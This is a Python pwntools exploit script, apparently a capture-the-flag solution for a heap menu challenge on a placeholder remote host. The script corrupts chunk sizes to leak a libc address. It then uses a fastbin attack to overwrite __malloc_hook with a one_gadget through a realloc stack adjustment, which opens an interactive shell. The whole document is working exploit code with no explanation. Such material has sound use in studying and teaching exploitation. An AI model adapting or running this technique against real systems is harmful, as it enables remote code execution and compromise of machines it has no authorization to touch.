from pwn import *

io=remote('xx.xx.xx.xx',xxxx)
libc=ELF('./libc-2.23.so')

def add(size):
    io.recvuntil('choice: ')
    io.sendline('1')
    io.recvuntil('size:')
    io.sendline(str(size))

def edit(index,size,data):
    io.recvuntil('choice: ')
    io.sendline('2')
    io.recvuntil('index:')
    io.sendline(str(index))
    io.recvuntil('size:')
    io.sendline(str(size))
    io.recvuntil('content:')
    io.send(data)

def free(index):
    io.recvuntil('choice: ')
    io.sendline('3')
    io.recvuntil('index:')
    io.sendline(str(index))

def show(index):
    io.recvuntil('choice: ')
    io.sendline('4')
    io.recvuntil('index:')
    io.sendline(str(index))

add(0x18)#0
add(0x18)#1
add(0x88)#2
add(0x88)#3

add(0x28)#4
add(0x28)#5
add(0x68)#6

edit(0,34,'a'*0x18+p8(0xb1))#edit chunk_size
free(1)
add(0xa8)#1
edit(1,0x20,'a'*0x18+p64(0x91))
free(2)
show(1)
io.recvuntil('content: ')
io.recv(0x20)
libc_base=u64(io.recv(8))-0x3c4b78
print(hex(libc_base))
malloc_hook=libc_base+libc.sym['__malloc_hook']
realloc = libc_base + libc.symbols['__libc_realloc']
one_gadget=libc_base+0x4526a

edit(4,50,'a'*0x28+p8(0xa1))
free(5)
free(6)
add(0x98)#2
edit(2,0x38,'a'*0x28+p64(0x71)+p64(malloc_hook-0x23))
add(0x68)#5
add(0x68)#6malloc_hook
edit(6,27,'a'*(0x13-8)+p64(one_gadget)+p64(realloc+16))

io.interactive()
